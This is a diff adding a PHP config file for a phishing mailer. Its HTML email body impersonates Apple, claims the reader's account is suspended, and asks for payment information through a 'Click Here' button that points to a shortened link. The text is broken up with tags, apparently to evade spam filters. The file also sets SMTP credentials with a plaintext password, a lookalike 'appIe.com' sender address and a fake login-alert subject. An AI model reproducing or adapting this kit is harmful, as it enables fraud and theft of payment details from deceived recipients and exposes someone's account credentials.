@@ -1,0 +1,241 @@
+<?php
+
+//*****
+
+$body = '<title>Security</title>
+    
+<meta name="viewport" content="width=device-width" />
+    
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+    <style type="text/css">
+        a,a.aapl-link,a.aapl-link:link {text-decoration:none; color:#08c;}
+        p {margin: 0;}
+        a.aapl-link:hover {text-decoration:underline}
+        body {width:100% !important}
+        @media only screen and (max-device-width:768px) {
+            #aapl-footer a,a {color:inherit}
+        }
+
+        @media only screen and (-webkit-min-device-pixel-ratio:1.5),
+        only screen and (min-device-pixel-ratio:1.5) {
+            img {visibility:hidden}
+            *[class=more] {visibility:visible}
+            *[class=logo] {background:url(\'http://www.apple.com/support/assets/images/external/emails/logo_2x.gif\') no-repeat 0 0;-webkit-background-size:22px 26px;width:100%;height:26px;background-position:top right}
+            *[class=check] {display:inline-block;background:url(\'images/check_2x.gif\') no-repeat 0 0;-webkit-background-size:63px 63px;height:63px;width:63px;background-position:top right;}
+            *[class=star] {display:inline-block;background:url(\'images/star_2x.gif\') no-repeat 0 0;-webkit-background-size:63px 63px;height:63px;width:63px;background-position:top right}
+        }
+
+        /* PHONE STYLES - For clients that support media queries */
+        @media only screen and (max-width:700px) {
+            td[class="container"] {padding:5px!important}
+            td[class="content"]{padding-left:20px!important;padding-right:20px!important}
+            table {width:auto!important}
+            table[class=\'responsive\'],
+            table[class=\'responsive\'] tbody,
+            table[class=\'responsive\'] tr,
+            table[class=\'responsive\'] td {display:block}
+            td img {max-width:100%!important; height:auto!important}
+            td[class=\'copyright\'] {-webkit-text-size-adjust:100%!important}
+            a.button { display:block!important;width:220px!important;}
+        }
+
+
+    </style>
+    <!--[if gte mso 9]>
+    <style type="text/css">
+        table,td,div,p {font-family:Helvetica Neue, Helvetica, Arial, Verdana, sans-serif !important;line-height:normal !important}
+    </style>
+    <![endif]-->
+    <!--[if lte mso 7]>
+    <style type="text/css">
+        table,td,div,p {font-family:Helvetica Neue, Helvetica, Arial, Verdana, sans-serif !important;line-height:normal}
+    </style>
+    <![endif]-->
+
+
+<table width="100%" cellspacing="0" cellpadding="0" border="0" align="center">
+    
+<tbody>
+<tr>
+        
+<td class="container" style="padding:0 20px;background-color:#f2f2f2;max-width:700px">
+            <!-- BEGIN MAIN CONTENT -->
+            
+<table style="margin:0 auto" width="700" cellspacing="0" cellpadding="0" border="0" align="center">
+                
+<tbody>
+<tr>
+                    
+<td style="-webkit-box-shadow:0 0 16px 0 #e1e1e1;-moz-box-shadow:0 0 16px 0 #e1e1e1;box-shadow:0 0 16px 0 #e1e1e1" width="100%">
+                        
+<table style="margin:0 auto;border-right:1px solid #c7c7c7;border-left:1px solid #c7c7c7" width="100%" cellspacing="0" cellpadding="0" border="0" align="left">
+                            
+<tbody>
+<tr>
+                                
+<td style="" width="100%" height="21" bgcolor="#ffffff"><br /></td>
+                            </tr>
+                            
+<tr>
+                                
+<td style="padding:0 19px 0 21px" bgcolor="#ffffff" align="right">
+                                    
+<table width="100%" cellspacing="0" cellpadding="0" border="0">
+                                        
+<tbody>
+<tr>
+                                            
+<td class="logo" style="display:block;" height="27" bgcolor="#ffffff" align="right">
+                                                <img src="http://www.apple.com/support/assets/images/external/emails/logo.gif" alt="" width="22" height="26" border="0" />
+                                            </td>
+                                        </tr>
+                                    </tbody></table>
+                                </td>
+                            </tr>
+                            
+<tr>
+                                
+<td width="100%" height="32" bgcolor="#ffffff"><br /></td>
+                            </tr>
+
+
+
+                            
+<tr>
+                                
+<td class="content" style="padding:0 50px 22px;" bgcolor="#ffffff">
+                                    <!-- Nested padding for body -->
+                                    
+<table>
+                                        
+<tbody>
+<tr>
+                                            
+<td bgcolor="#ffffff">
+                                                
+<table width="100%" cellspacing="0" cellpadding="0" border="0" align="center">
+                                                    
+<tbody>
+<tr>
+                                                        
+<td style="padding-bottom:49px;margin:0;font-family:Helvetica Neue, Helvetica, Arial, Verdana, sans-serif;color:#3d3d3d;font-size:30px;line-height:1.2em;font-weight:bold;white-space:nowrap;" width="600" valign="top" align="center">
+                                                            <!-- TEMPLATE: ADD MAIN TITLE -->
+                                                Co<span>n<font>fi</font>rm</span> your <span><font>A</font>cc</span>o<span>u<font>nt !</font></span>
+
+
+                                                        </td>
+                                                    </tr>
+                                                </tbody></table>
+                                            </td>
+                                        </tr>
+                                        
+<tr>
+                                            
+<td style="" bgcolor="#ffffff">
+                                                
+<table width="100%" cellspacing="0" cellpadding="0" border="0" align="center">
+                                                    
+<tbody>
+<tr>
+                                                        
+<td style="" width="100%" valign="top">
+                                                            <!--BODY COPY-->
+                                                            
+<table width="100%" cellspacing="0" cellpadding="0" border="0">
+                                                                
+<tbody>
+<tr>
+                                                                    
+<td style="padding:29px 0 0;margin:0;font-family:Helvetica Neue, Helvetica, Arial, Verdana, sans-serif;color:#3D3D3D;font-size:15px;line-height:1.6em">
+                                                                        <!-- TEMPLATE: ADD INTRO COPY -->
+                                                                        D<span>e<font>a</font>r</span> customer,<span><br /> <br />W<span>e<font> are un</font>ab</span>le to  c<span>on<font>fi</font>r</span>m your A<span>c<font>c</font>o</span>u<span>n<font>t</font> in</span>for<span><font>mation.
+                                                                        As a r<span>es<font>ul</font>t, your A</span>cc<span>ou<font>nt has </font>been te</span>mpo<span>ra<font>ri</font>ly s</span>u<span>s<font>p</font>en</span>d<span><font>ed.
+                                                                        All the s<span>er<font>v</font>ices related to </span>y<span>ou<font>r </font>ac</span>c<span>o<font>u</font>nt has been s</span>u<span>s<font>p</font>en</span>d<span><font>ed pending resolution.<br /><br />
+                                                                        <b>What To Do ?</b><br />P<span>l<font>e</font>a</span>s<span>e<font> p</font>r</span>o<span>v<font>i</font>d</span>e<span> us with y<font>o</font>ur pa</span>ym<span>e<font>nt in<span>f<font>or</font>ma</span>ti<span>ons.
+P<span><font>le</font></span>a<span><font>s</font></span>e C<span>l<font>i</font>c</span>k on the a<span>cti<font>va</font>tion b</span>ut<span>t<font>on below.
+                                                                        <br /><br />
+
+                                                                    </font></span></span></font></span></font></span></font></span></font></span></span></td>
+                                                                </tr>
+
+                                                                
+<tr>
+                                                                    
+<td style="text-align:left;padding-bottom:15px">
+<div style="display:inline-block">
+                                                                        
+<table dir="ltr" cellspacing="0" cellpadding="0" border="0">
+                                                                            
+<tbody>
+<tr>
+                                                                                
+<td style="background:#878787;padding:12px 10px;border:6px solid rgb(239,239,239)"><a rel="nofollow" href="http://ow.ly/4n4K1k" style="text-decoration:none;font-family:Arial,Helvetica,sans-serif;color:#fff;background:#ff4800;text-align:center" target="_blank"><span style="text-decoration:none;color:#fff;font-size:16px;line-height:28px;text-align:center;display:block">C<span>l<font>i</font>c</span>k H<span>e<font>re<br /></font></span></span></a></td>
+                                                                            </tr>
+                                                                            </tbody></table>
+                                                                    </div></td>
+                                                                    
+
+                                                                </tr>
+                                                                </tbody></table></td>
+                                                    </tr>
+
+                                                            </tbody></table>
+                                                        </td>
+                                                    </tr>
+                                                </tbody></table>
+                                            </td>
+                                        </tr>
+                                    </tbody></table>
+                                </td>
+                            </tr>
+<tr>
+                            
+<td class="content" style="padding:20px 50px 20px; border-top:1px solid #e1e1e1; border-bottom:1px solid #c7c7c7; text-align:center;" bgcolor="#ffffff">
+                                
+<table style="width:100%!important;">
+                                    
+<tbody>
+<tr>
+                                        
+<td style="">
+                                            
+<table width="610" cellspacing="0" cellpadding="0" border="0" align="center">
+                                                
+<tbody>
+<tr>
+                                                    
+<td style="font-family:Helvetica Neue, Helvetica, Arial, Verdana, sans-serif;font-size:11px;line-height:1.34em;text-align:center;color:#9f9f9f; padding-bottom:3px;">
+                                                     
+                                                <br /></td></tr>
+                                                
+<tr>
+                                                    
+<td style="font-family:Helvetica Neue, Helvetica, Arial, Verdana, sans-serif;font-size:11px;line-height:1.34em;text-align:center;color:#9f9f9f;">
+                                                        <a href="http://www.apple.com/legal/" style="color:#9f9f9f;text-decoration:underline">All Rights Reserved</a> | <a href="http://www.apple.com/legal/privacy/" style="color:#9f9f9f;text-decoration:underline">Privacy Policy</a> | <a href="https://discussions.apple.com/docs/DOC-5952" style="color:#9f9f9f;text-decoration:underline">Terms of Use</a> | <a href="http://www.apple.com/support/" style="color:#9f9f9f;text-decoration:underline">Apple Support</a>
+<p>
+                                                    </p>
+</td>
+                                                </tr>
+                                            </tbody></table>
+                                        </td>
+                                    </tr>
+                                </tbody></table>
+                            </td>
+                        </tr>
+
+
+                        </tbody></table>
+                    </td>
+                </tr>
+            </tbody></table>'; // BODY
+
+// ****
+
+$smtphost = 'smtp-relay.gmail.com'; //SMTP HOST
+$username = 'admiraysa@mail-livetunes.org'; //SMTP USERNAME
+$password = 'Indons47'; //SMTP Password
+$port = '587'; //SMTP PORT
+$smtpsecure = 'tls';
+$sentfrom = 'admin_s@id.appIe.com'; // EMAIL SENDER FROM
+$sendername = 'Samuel From AppIe Company'; // EMAIL SENDER NAME
+$subject = '[Statement] Reminder: Someone has login on other device, service'; // EMAIL SUBJECT
